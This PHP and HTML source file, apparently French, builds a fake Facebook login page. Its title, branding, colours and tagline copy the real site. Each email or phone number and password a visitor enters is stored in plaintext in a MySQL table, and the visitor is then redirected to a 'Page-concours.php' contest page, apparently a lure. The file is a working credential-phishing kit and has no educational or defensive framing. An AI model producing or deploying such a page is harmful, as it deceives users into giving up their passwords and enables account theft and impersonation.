<?php
// Connexion à la base de données
$host = "localhost";
$dbname = "Instagram";
$username = "root";
$password = "root";

try {
    $pdo = new PDO("mysql:host=$host;dbname=$dbname;charset=utf8", $username, $password); 
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Erreur de connexion : " . $e->getMessage());
}

// Vérification si le formulaire est soumis
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $error = "";

    if (empty($_POST["username"]) || empty($_POST["password"])) {
        $error = "Veuillez remplir tous les champs.";
    } else {
        $username = $_POST["username"];
        $password = $_POST["password"]; // Sécurisé à améliorer

        // Insérer les informations dans la base de données
        $stmt = $pdo->prepare("INSERT INTO connexion (username, password) VALUES (:username, :password)");
        $stmt->bindParam(":username", $username);
        $stmt->bindParam(":password", $password);
        $stmt->execute();

        header("Location: Page-concours.php");
        exit();
    }
}
?>

<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Connexion</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
        integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <style>
          body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            max-width: 90%;
        }

        .left h1 {
            color: #1877f2;
            font-size: 48px;
            font-weight: bold;
        }

        .left p {
            font-size: 18px;
            color: #333;
        }

        .right {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 360px;
        }

        .right input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 16px;
        }

        .right button {
            width: 100%;
            padding: 12px;
            background: #1fa74c;
            color: white;
            font-size: 18px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
        }

        .right button:hover {
            background: #165ec6;
        }

        .forgot {
            display: block;
            margin: 10px 0;
            color: #1877f2;
            text-decoration: none;
        }

        .register {
            background: #42b72a;
            padding: 12px;
            color: white;
            font-size: 16px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            margin-top: 10px;
        }

        @media (min-width: 768px) {
            .container {
                flex-direction: row;
                justify-content: space-between;
                max-width: 980px;
            }
            .left {
                flex: 1;
                text-align: left;
                padding-right: 50px;
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="left">
            <h1>Facebook</h1>
            <p>Avec Facebook, partagez et restez en contact avec votre entourage.</p>
        </div>
        <div class="right">
            <form action="" method="POST">
                <input type="text" name="username" placeholder="Adresse e-mail ou numéro de tél." required>
                <input type="password" name="password" placeholder="Mot de passe" required>
                <button type="submit">Se connecter</button>
            </form>
            <a href="#" class="forgot">Mot de passe oublié ?</a>
            <hr>
            <button class="register">Créer un nouveau compte</button>
        </div>
    </div>
</body>

</html>
